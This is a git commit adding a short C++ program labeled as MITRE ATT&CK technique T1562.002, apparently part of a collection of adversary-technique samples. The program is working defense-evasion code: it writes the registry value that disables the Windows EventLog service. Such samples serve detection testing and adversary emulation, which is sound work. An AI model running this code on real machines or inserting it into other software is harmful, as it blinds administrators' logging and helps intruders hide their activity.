aff660c98940770f830986120a6e02a03f54bf5a
Gavrilut Dragos <gavrilut.dragos@gmail.com>
2024-12-05 10:52:49 +0200

    T1562.002

---
+++ MiTRE/T1562.002.V1.cpp
@@ -0,0 +1,19 @@
+// Link      = https://attack.mitre.org/techniques/T1562/002/
+// Technique = Impair Defenses: Disable Windows Event Logging
+// ID        = T1562.002
+// Tactics   = Defense Evasion,
+
+#include <Windows.h>
+
+int main() {
+    HKEY hKey;
+    DWORD value = 4;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\EventLog", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
+    {
+        return 1;
+    }
+    RegSetValueExA(hKey, "Start", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
+    RegCloseKey(hKey);
+ 
+    return 0;
+}
